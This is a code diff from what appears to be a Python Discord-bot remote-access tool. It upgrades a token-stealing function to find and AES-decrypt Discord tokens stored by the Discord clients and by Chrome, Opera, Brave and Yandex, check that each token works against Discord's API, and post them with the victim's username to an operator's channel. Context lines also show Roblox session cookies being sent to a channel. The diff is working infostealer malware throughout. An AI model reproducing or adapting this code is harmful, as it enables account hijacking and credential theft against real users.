@@ -595,64 +595,131 @@ Bypass IP lock with https://rbxfresh.com/
 """)
         await ctx.send(f":white_check_mark: **{os.getlogin()}**'s cookies have been sent in <#{roblosecurity_channel_id}>")
 
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
-
-    tokens = []
-
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-
 def token_grab():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+            LOCAL = os.getenv("LOCALAPPDATA")
+            ROAMING = os.getenv("APPDATA")
+            PATHS = [
+                ROAMING + "\\Discord",
+                ROAMING + "\\discordcanary",
+                ROAMING + "\\discordptb",
+                LOCAL + "\\Google\\Chrome\\User Data\\Default",
+                LOCAL + "\\Google\\Chrome\\User Data\\Profile 1",
+                LOCAL + "\\Google\\Chrome\\User Data\\Profile 2",
+                LOCAL + "\\Google\\Chrome\\User Data\\Profile 3",
+                LOCAL + "\\Google\\Chrome\\User Data\\Profile 4",
+                LOCAL + "\\Google\\Chrome\\User Data\\Profile 5",
+                ROAMING + "\\Opera Software\\Opera Stable",
+                LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+                LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
+                ROAMING + "\\Opera Software\\Opera GX Stable\\"
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+            ]
 
-    message = ''
+            for path in reversed(PATHS):
+                if not os.path.exists(path):
+                    PATHS.remove(path)
 
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
+            regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
+            regex2 = r"mfa\\.[\\w-]{84}"
+            encrypted_regex = "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$]{120}"
 
-        message += f'\n**{platform}**\n```\n'
+            def getheaders(token=None, content_type="application/json"):
+                headers = {
+                    "Content-Type": content_type,
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+                }
+                if token:
+                    headers.update({"Authorization": token})
+                return headers
 
-        tokens = find_tokens(path)
+            def decrypt_payload(cipher, payload):
+                return cipher.decrypt(payload)
 
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
-            message += f'No tokens found.\n'
+            def generate_cipher(aes_key, iv):
+                return AES.new(aes_key, AES.MODE_GCM, iv)
 
-        message += '```'
+            def decrypt_token(buff, master_key):
+                try:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = generate_cipher(master_key, iv)
+                    decrypted_pass = decrypt_payload(cipher, payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
+                except Exception:
+                    return "Couldn't decrypt token"
 
-    try:
-        return message
-    except:
-        pass
+            def get_master_key(path):
+                with open(path, "r", encoding="utf-8") as f:
+                    local_state = f.read()
+                local_state = json.loads(local_state)
+
+                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                master_key = master_key[5:]
+                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                return master_key
+
+            def gettokens(path):
+                path1=path
+                path += "\\Local Storage\\leveldb"
+                tokens = []
+                try:
+                    if not "discord" in path.lower():
+                        for file_name in os.listdir(path):
+                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                                continue
+                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                                for token in findall(regex1, line):
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                    except Exception:
+                                        continue
+                                    tokens.append(token)
+                                for token in findall(regex2, line):
+                                    print(token)
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                    except Exception:
+                                        continue
+                                    tokens.append(token)
+                    else:
+                        for file_name in os.listdir(path):
+                            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                                continue
+                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                                for y in findall(encrypted_regex, line):
+                                    token = decrypt_token(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(path1 + '\\Local State'))
+                                    try:
+                                        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
+                                        if r.status_code == 200:
+                                            if token in tokens:
+                                                continue
+                                            tokens.append(token)
+                                            
+                                    except:
+                                        continue
+                    return tokens
+                except Exception as e:
+                    return []
+            all_tokens=[]
+            for path_grab in PATHS:
+                if os.path.exists(path_grab):
+                    for token in gettokens(path_grab):
+                        all_tokens.append(f"`{path_grab}` - **{token}**")
+            return str(all_tokens).replace("[", "").replace("]", "").replace("'", "").replace(",", "")
 
 @client.command()
 async def grabdiscord(ctx, *, usid):
     if usid == clientid:
         postchannel = client.get_channel(int(tokens_channel_id))
         await ctx.send(f":skull_crossbones: Searching for **{os.getlogin()}**'s account tokens...")
-        await postchannel.send(f"{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n{token_grab()}")
+        await postchannel.send(f"{ctx.author.mention} Account tokens for **{os.getlogin()}** : \n\n{token_grab()}")
         await ctx.send(f":white_check_mark: **{os.getlogin()}**'s account tokens have been sent in <#{tokens_channel_id}>")
         
 
